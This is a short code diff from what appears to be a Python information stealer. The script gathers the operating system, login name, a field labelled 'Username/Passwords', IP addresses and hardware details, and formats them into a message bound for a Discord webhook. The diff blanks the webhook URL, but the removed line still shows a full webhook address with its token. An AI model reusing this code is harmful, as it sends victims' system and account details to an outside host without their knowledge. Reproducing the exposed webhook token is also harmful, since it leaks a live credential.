@@ -29,7 +29,7 @@ ip_addresses_str = ", ".join(ip_addresses)
 message = f"```\nOperating System: {os.name}\nUser Name: {os.getlogin()}\nUsername/Passwords: {psutil.users()}\nNetwork: {ip_addresses_str}\nCPU: {platform.processor()}\nGPU: {adapter.Name}```"
 
 # Set the Discord webhook URL
-url = "https://discord.com/api/webhooks/1077956883257753660/dHsrZiymCOWigG-5mKOgflAJmpi_ouR-FAjBs-_Ffig_4nLQkHy3cIEU344qQNMv62Ru"
+url = ""
 
 # Set the message payload
 payload = {
